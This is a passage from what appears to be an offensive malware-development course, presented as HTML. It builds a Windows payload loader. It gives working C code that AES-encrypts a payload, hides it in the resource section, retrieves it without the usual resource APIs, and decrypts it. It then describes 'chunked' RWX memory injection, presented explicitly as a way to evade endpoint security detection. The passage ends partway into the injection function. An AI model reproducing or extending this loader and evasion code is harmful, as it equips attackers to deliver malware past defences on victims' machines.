<span class="token keyword">void</span> <span class="token function">AES256_CBC_decrypt</span><span class="token punctuation">(</span>AES256_CBC_ctx<span class="token operator">*</span> ctx<span class="token punctuation">,</span> <span class="token class-name">size_t</span> blocks<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> plain<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>encrypted<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">AESCBC_decrypt</span><span class="token punctuation">(</span>ctx<span class="token operator">-&gt;</span>ctx<span class="token punctuation">.</span>rk<span class="token punctuation">,</span> ctx<span class="token operator">-&gt;</span>iv<span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> blocks<span class="token punctuation">,</span> plain<span class="token punctuation">,</span> encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>However, the function the functions have been updated to be as follows:</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">boolean <span class="token function">AES256_CBC_encrypt</span><span class="token punctuation">(</span>IN AES256_CBC_ctx<span class="token operator">*</span> ctx<span class="token punctuation">,</span> IN <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> plain<span class="token punctuation">,</span> IN <span class="token class-name">size_t</span> plainsize<span class="token punctuation">,</span> OUT PBYTE<span class="token operator">*</span> encrypted<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>plainsize <span class="token operator">%</span> <span class="token number">16</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token class-name">size_t</span> blocks <span class="token operator">=</span> plainsize <span class="token operator">/</span> <span class="token number">16</span><span class="token punctuation">;</span>
    <span class="token operator">*</span>encrypted <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token function">HeapAlloc</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> HEAP_ZERO_MEMORY<span class="token punctuation">,</span> plainsize<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>encrypted <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token function">AESCBC_encrypt</span><span class="token punctuation">(</span>ctx<span class="token operator">-&gt;</span>ctx<span class="token punctuation">.</span>rk<span class="token punctuation">,</span> ctx<span class="token operator">-&gt;</span>iv<span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> blocks<span class="token punctuation">,</span> <span class="token operator">*</span>encrypted<span class="token punctuation">,</span> plain<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

    <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

boolean <span class="token function">AES256_CBC_decrypt</span><span class="token punctuation">(</span>IN AES256_CBC_ctx<span class="token operator">*</span> ctx<span class="token punctuation">,</span> IN <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> encrypted<span class="token punctuation">,</span> IN <span class="token class-name">size_t</span> ciphersize<span class="token punctuation">,</span> OUT PBYTE<span class="token operator">*</span> plain<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ciphersize <span class="token operator">%</span> <span class="token number">16</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token class-name">size_t</span> blocks <span class="token operator">=</span> ciphersize <span class="token operator">/</span> <span class="token number">16</span><span class="token punctuation">;</span>
    <span class="token operator">*</span>plain <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token function">HeapAlloc</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> HEAP_ZERO_MEMORY<span class="token punctuation">,</span> ciphersize<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>plain <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token function">AESCBC_decrypt</span><span class="token punctuation">(</span>ctx<span class="token operator">-&gt;</span>ctx<span class="token punctuation">.</span>rk<span class="token punctuation">,</span> ctx<span class="token operator">-&gt;</span>iv<span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> blocks<span class="token punctuation">,</span> <span class="token operator">*</span>plain<span class="token punctuation">,</span> encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

    <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-23">Payload Encryption</h4>
<p>To perform payload encryption, a new program has been developed called <code>PayloadEncrypter</code>. This program's primary function is to read a payload file from the disk, encrypt it, and then save it under a new name, <code>Payload.ctaes</code>. This encrypted payload, <code>Payload.ctaes</code>, becomes an integral part of the loader's project and is stored within its resource section.</p>
<p>It's important to note that the ctaes library lacks support for padding. Therefore, before invoking the <code>AES256_CBC_encrypt</code> function, <code>PayloadEncrypter</code> must manually add padding to ensure that the payload buffer's size is a multiple of 16 bytes, as required by the AES algorithm.</p>
<p>The code for <code>PayloadEncrypter</code> isn't entirely new, and a similar approach was used when working with the <a href="https://github.com/kokke/tiny-AES-c" target="_blank">Tiny-AES</a> library in the <em>Payload Encryption - AES Encryption</em>
 module. Consequently, this process is not extensively discussed in the 
module but is instead shared within the module's code. It's worth 
mentioning that <code>PayloadEncrypter</code> stores the AES key and Initialization Vector (IV) after the payload's ciphertext bytes in the generated <code>Payload.ctaes</code> file, as illustrated in the following images.</p>
<img width="1000" alt="image" style="margin:auto" src="23_files/dllldr-465958673-ef1605bb-0ba9-4ab6-bb09-172b133234c7.png">
<img width="800" alt="image" style="margin:auto" src="23_files/dllldr-565958685-e7b8bceb-a8f9-49e4-8755-54579325c39c.png">
<h4 id="toc-heading-24">Payload Decryption</h4>
<p>From the loader's perspective, the payload is stored in the <code>.rsrc</code> section. Therefore, it needs to perform the following two steps:</p>
<p>First, retrieve the payload from the resource section and copy it to a local buffer. This task is accomplished using the <code>GetResourcePayload</code> function, which is outlined below. <code>GetResourcePayload</code> internally calls <a href="https://github.com/NUL0x4C/ManualRsrcDataFetching/blob/main/ManualResourceDataFetching/main.c#L8" target="_blank">GetResourceData</a> to locate the payload file within the resource section, without utilizing the <code>FindResource</code>, <code>LoadResource</code>, <code>LockResource</code>, or <code>SizeofResource</code> WinAPIs. The <code>GetResourcePayload</code> function requires the following parameters:</p>
<ul>
<li>
<p><code>hModule</code> - A handle to the module from which the resource section payload should be retrieved.</p>
</li>
<li>
<p><code>wResourceId</code> - The resource ID associated with the payload, which was assigned during the creation of the resource section.</p>
</li>
<li>
<p><code>ppResourceBuffer</code> - A pointer to a <code>PBYTE</code> variable that will receive a pointer to the first byte of the resource payload.</p>
</li>
<li>
<p><code>pdwResourceSize</code> - A pointer to a <code>DWORD</code> variable that will capture the size of the resource payload.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">GetResourceData</span><span class="token punctuation">(</span>IN HMODULE hModule<span class="token punctuation">,</span> IN WORD ResourceId<span class="token punctuation">,</span> OUT PVOID<span class="token operator">*</span> ppResourceRawData<span class="token punctuation">,</span> OUT PDWORD psResourceDataSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	CHAR<span class="token operator">*</span>                   pBaseAddr          <span class="token operator">=</span> <span class="token punctuation">(</span>CHAR<span class="token operator">*</span><span class="token punctuation">)</span>hModule<span class="token punctuation">;</span>
	PIMAGE_DOS_HEADER       pImgDosHdr         <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>pBaseAddr<span class="token punctuation">;</span>
	PIMAGE_NT_HEADERS       pImgNTHdr          <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pBaseAddr <span class="token operator">+</span> pImgDosHdr<span class="token operator">-&gt;</span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span>
	PIMAGE_OPTIONAL_HEADER  pImgOptionalHdr    <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_OPTIONAL_HEADER<span class="token punctuation">)</span><span class="token operator">&amp;</span>pImgNTHdr<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">;</span>
	PIMAGE_DATA_DIRECTORY   pDataDir           <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DATA_DIRECTORY<span class="token punctuation">)</span><span class="token operator">&amp;</span>pImgOptionalHdr<span class="token operator">-&gt;</span>DataDirectory<span class="token punctuation">[</span>IMAGE_DIRECTORY_ENTRY_RESOURCE<span class="token punctuation">]</span><span class="token punctuation">;</span>

	PIMAGE_RESOURCE_DIRECTORY               pResourceDir    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> pResourceDir2    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> pResourceDir3   <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PIMAGE_RESOURCE_DIRECTORY_ENTRY         pResourceEntry  <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> pResourceEntry2  <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> pResourceEntry3 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PIMAGE_RESOURCE_DATA_ENTRY              pResource	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>


	pResourceDir	<span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pBaseAddr <span class="token operator">+</span> pDataDir<span class="token operator">-&gt;</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
	pResourceEntry	<span class="token operator">=</span> <span class="token punctuation">(</span>IMAGE_RESOURCE_DIRECTORY_ENTRY<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pResourceDir <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span>pResourceDir<span class="token operator">-&gt;</span>NumberOfNamedEntries <span class="token operator">+</span> pResourceDir<span class="token operator">-&gt;</span>NumberOfIdEntries<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>pResourceEntry<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>DataIsDirectory <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>

		pResourceDir2	<span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pBaseAddr <span class="token operator">+</span> pDataDir<span class="token operator">-&gt;</span>VirtualAddress <span class="token operator">+</span> <span class="token punctuation">(</span>pResourceEntry<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>OffsetToDirectory <span class="token operator">&amp;</span> <span class="token number">0x7FFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		pResourceEntry2 <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pResourceDir2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>pResourceEntry2<span class="token operator">-&gt;</span>DataIsDirectory <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> pResourceEntry2<span class="token operator">-&gt;</span>Id <span class="token operator">==</span> ResourceId<span class="token punctuation">)</span> <span class="token punctuation">{</span>

			pResourceDir3   <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pBaseAddr <span class="token operator">+</span> pDataDir<span class="token operator">-&gt;</span>VirtualAddress <span class="token operator">+</span> <span class="token punctuation">(</span>pResourceEntry2<span class="token operator">-&gt;</span>OffsetToDirectory <span class="token operator">&amp;</span> <span class="token number">0x7FFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			pResourceEntry3 <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pResourceDir3 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			pResource       <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DATA_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pBaseAddr <span class="token operator">+</span> pDataDir<span class="token operator">-&gt;</span>VirtualAddress <span class="token operator">+</span> <span class="token punctuation">(</span>pResourceEntry3<span class="token operator">-&gt;</span>OffsetToData <span class="token operator">&amp;</span> <span class="token number">0x7FFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token operator">*</span>ppResourceRawData	<span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span>pBaseAddr <span class="token operator">+</span> <span class="token punctuation">(</span>pResource<span class="token operator">-&gt;</span>OffsetToData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token operator">*</span>psResourceDataSize 	<span class="token operator">=</span> pResource<span class="token operator">-&gt;</span>Size<span class="token punctuation">;</span>

			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>ppResourceRawData <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>psResourceDataSize <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>

	<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


BOOL <span class="token function">GetResourcePayload</span><span class="token punctuation">(</span>IN HMODULE hModule<span class="token punctuation">,</span> IN WORD wResourceId<span class="token punctuation">,</span> OUT PBYTE<span class="token operator">*</span> ppResourceBuffer<span class="token punctuation">,</span> OUT PDWORD pdwResourceSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	
	PBYTE	pTmpResourceBuffer	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetResourceData</span><span class="token punctuation">(</span>hModule<span class="token punctuation">,</span> wResourceId<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pTmpResourceBuffer<span class="token punctuation">,</span> pdwResourceSize<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token operator">*</span>ppResourceBuffer <span class="token operator">=</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> HEAP_ZERO_MEMORY<span class="token punctuation">,</span> <span class="token operator">*</span>pdwResourceSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">*</span>ppResourceBuffer<span class="token punctuation">,</span> pTmpResourceBuffer<span class="token punctuation">,</span> <span class="token operator">*</span>pdwResourceSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Next, it retrieves the AES key and IV from the payload file and proceeds to invoke the <code>AES256_CBC_decrypt</code> function. This operation is carried out using the <code>FetchAesConfAndDecrypt</code> function, as demonstrated below. <code>FetchAesConfAndDecrypt</code> requires the following parameters:</p>
<ul>
<li>
<p><code>pPayloadBuffer</code> - A pointer to the ciphertext payload.</p>
</li>
<li>
<p><code>sPayloadSize</code> - A pointer to a <code>SIZE_T</code> 
variable that stores the size of the ciphertext payload. After 
decryption, this variable will be updated to reflect the size of the 
plaintext payload.</p>
</li>
<li>
<p><code>ppDecryptedPayload</code> - A pointer to a <code>PBYTE</code> variable that will store the base address of the plaintext payload.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>	<span class="token macro-name">KEY_SIZE</span>	                <span class="token expression"><span class="token number">32</span>           </span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>	<span class="token macro-name">IV_SIZE</span>		                <span class="token expression"><span class="token number">16</span>           </span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>	<span class="token macro-name function">SET_TO_MULTIPLE_OF_4096</span><span class="token expression"><span class="token punctuation">(</span>X<span class="token punctuation">)</span>	<span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>X<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4095</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token number">4095</span><span class="token punctuation">)</span> <span class="token punctuation">)</span></span></span>

BOOL <span class="token function">FetchAesConfAndDecrypt</span><span class="token punctuation">(</span>IN PBYTE pPayloadBuffer<span class="token punctuation">,</span> IN OUT SIZE_T<span class="token operator">*</span> sPayloadSize<span class="token punctuation">,</span> OUT PBYTE<span class="token operator">*</span> ppDecryptedPayload<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	
	BOOL			bResult				<span class="token operator">=</span> FALSE<span class="token punctuation">;</span>
	AES256_CBC_ctx	CtAesCtx			<span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	BYTE			pAesKey	<span class="token punctuation">[</span>KEY_SIZE<span class="token punctuation">]</span>	<span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	BYTE			pAesIv	<span class="token punctuation">[</span>IV_SIZE<span class="token punctuation">]</span>	<span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	ULONG_PTR		uAesKeyPtr			<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
					uAesIvPtr			<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	uAesKeyPtr	<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pPayloadBuffer <span class="token operator">+</span> <span class="token operator">*</span>sPayloadSize<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>KEY_SIZE <span class="token operator">+</span> IV_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	uAesIvPtr	<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pPayloadBuffer <span class="token operator">+</span> <span class="token operator">*</span>sPayloadSize<span class="token punctuation">)</span> <span class="token operator">-</span> IV_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">Memcpy</span><span class="token punctuation">(</span>pAesKey<span class="token punctuation">,</span> uAesKeyPtr<span class="token punctuation">,</span> KEY_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">Memcpy</span><span class="token punctuation">(</span>pAesIv<span class="token punctuation">,</span> uAesIvPtr<span class="token punctuation">,</span> IV_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Updating the payload size</span>
	<span class="token operator">*</span>sPayloadSize <span class="token operator">=</span> <span class="token operator">*</span>sPayloadSize <span class="token operator">-</span> <span class="token punctuation">(</span>KEY_SIZE <span class="token operator">+</span> IV_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token comment">// Decrypting</span>
	<span class="token function">AES256_CBC_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>CtAesCtx<span class="token punctuation">,</span> pAesKey<span class="token punctuation">,</span> pAesIv<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">AES256_CBC_decrypt</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>CtAesCtx<span class="token punctuation">,</span> pPayloadBuffer<span class="token punctuation">,</span> <span class="token operator">*</span>sPayloadSize<span class="token punctuation">,</span> ppDecryptedPayload<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>

	<span class="token comment">// "ppDecryptedPayload" is resized to be of size multiple of 4096</span>
    <span class="token operator">*</span>ppDecryptedPayload <span class="token operator">=</span> <span class="token function">HeapReAlloc</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> HEAP_ZERO_MEMORY<span class="token punctuation">,</span> <span class="token operator">*</span>ppDecryptedPayload<span class="token punctuation">,</span> <span class="token function">SET_TO_MULTIPLE_OF_4096</span><span class="token punctuation">(</span><span class="token operator">*</span>sPayloadSize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>ppDecryptedPayload <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> 
        <span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>

	bResult <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>

_FUNC_CLEANUP<span class="token operator">:</span>
	<span class="token function">HeapFree</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> pPayloadBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// Free allocated heap in 'GetResourcePayload' function</span>
	<span class="token keyword">return</span> bResult<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-25">Payload Injection By Chunking</h3>
<p>The loader will implement payload injection by chunking which still relies on the same standard syscalls (<code>NtAllocateVirtualMemory</code> and <code>NtProtectVirtualMemory</code>) but these syscalls are executed multiple times using a method known as <em>chunking</em>.
 Chunking involves grouping various pieces of information into a single,
 more cohesive dataset. In this module, chunking will be used to inject 
the payload into memory. This is achieved by allocating small chunks of 
memory successively until the combined buffer size is sufficient to 
accommodate the entire payload. The same logic is applied to modify 
memory permissions to allow execution after allocation. Injecting the 
payload in this manner offers several advantages:</p>
<ul>
<li>
<p>Some security vendors tend to filter out small allocations, 
particularly from the perspective of ETW. This is because small 
allocations are quite common on a system, making it challenging to 
monitor every single one. As a result, allocating memory in small 
regions at a time may potentially be categorized as a non-critical 
event, although still detectable.</p>
</li>
<li>
<p>By having the loader make multiple calls to <code>NtAllocateVirtualMemory</code> and <code>NtProtectVirtualMemory</code>,
 it can disrupt the typical injection pattern (allocate - modify 
permissions - execute) often scrutinized by security vendors seeking 
malicious activity.</p>
</li>
</ul>
<p>It's important to note that while chunking is a valuable technique to
 evade injection-based detections, it is not a foolproof solution.</p>
<p>The image below illustrates how the loader allocates and adjusts the 
memory permissions of the memory region intended for writing the 
payload. Notice the <code>READ_ONLY</code> memory page that is intentionally left behind.</p>
<img width="1250" alt="image" style="margin:auto" src="23_files/dllldr-666213472-99b128ae-460b-47bf-af75-fdc08e35c9e7.png">
<h4 id="toc-heading-26">Payload Injection Steps</h4>
<p>The injection process will go through the following series of steps:</p>
<ol>
<li>
<p>The payload size is adjusted to become a multiple of a single page size, which is 4096 bytes.</p>
</li>
<li>
<p><code>NtAllocateVirtualMemory</code> is invoked to <strong>reserve</strong> a memory region. This reserved memory region is designed to accommodate the payload along with an additional <code>READ_ONLY</code> memory page, intentionally left behind for the remainder of the injection procedure. This particular <code>NtAllocateVirtualMemory</code>
 call serves the purpose of reserving memory and cannot be carried out 
in chunks. This is because there is a risk that the next address to be 
reserved (on the subsequent memory page) might already be allocated for 
another task. If you're interested in further details, <em>Module 6: Windows Memory Management</em> dives into the concepts of reserved vs. committed memory.</p>
</li>
<li>
<p>The base address of the allocation is incremented by 4096 (which corresponds to the page size) to bypass the <code>READ_ONLY</code> memory page.</p>
</li>
<li>
<p>A for-loop is initiated, with iterations equal to (payload size/page size). During each iteration, <code>NtAllocateVirtualMemory</code> is called once more to <strong>commit</strong> the memory page that was previously reserved. This committed memory page is configured as a <code>PAGE_READWRITE</code>
 memory region. After each iteration, the base address is further 
incremented by 4096 (page size) to point to the subsequent memory page 
awaiting commitment.</p>
</li>
<li>
<p>A similar for-loop is used to invoke <code>NtProtectVirtualMemory</code>, which updates memory permissions to <code>PAGE_EXECUTE_READWRITE</code>. This loop mirrors the previous step in terms of iteration count.</p>
</li>
<li>
<p>Finally, the payload is copied over to the newly allocated RWX memory. This is accomplished through a for-loop that uses <code>memcpy</code> for a total of (payload size/page size) iterations.</p>
</li>
</ol>
<h4 id="toc-heading-27">InjectEncryptedPayload Function</h4>
<p>The <code>InjectEncryptedPayload</code> function performs the steps explained in the previous section along with decrypting the payload via the <code>FetchAesConfAndDecrypt</code> function. Moreover, <code>InjectEncryptedPayload</code> returns <code>TRUE</code> if the payload is successfully injected. The function also requires the following parameters:</p>
<ul>
<li>
<p><code>pPayloadBuffer</code> - The base address of the ciphertext payload (returned by <code>GetResourcePayload</code>).</p>
</li>
<li>
<p><code>sPayloadSize</code> - The size of the ciphertext payload (returned by <code>GetResourcePayload</code>).</p>
</li>
<li>
<p><code>pInjectedPayload</code> - A pointer to a <code>PBYTE</code> variable that will receive the base address of the injected plaintext payload.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>		<span class="token macro-name">PAGE_SIZE</span>			<span class="token expression"><span class="token number">4096</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>		<span class="token macro-name function">SET_TO_MULTIPLE_OF_4096</span><span class="token expression"><span class="token punctuation">(</span>X<span class="token punctuation">)</span>	<span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>X<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4095</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token number">4095</span><span class="token punctuation">)</span> <span class="token punctuation">)</span></span></span>


BOOL <span class="token function">InjectEncryptedPayload</span><span class="token punctuation">(</span>IN PBYTE pPayloadBuffer<span class="token punctuation">,</span> IN SIZE_T sPayloadSize<span class="token punctuation">,</span> OUT PBYTE<span class="token operator">*</span> pInjectedPayload<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token comment">// We decrypt the payload to work with the new payload size </span>
	PBYTE		pDecryptedPayload	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">FetchAesConfAndDecrypt</span><span class="token punctuation">(</span>pPayloadBuffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sPayloadSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pDecryptedPayload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	NTSTATUS	STATUS			    <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
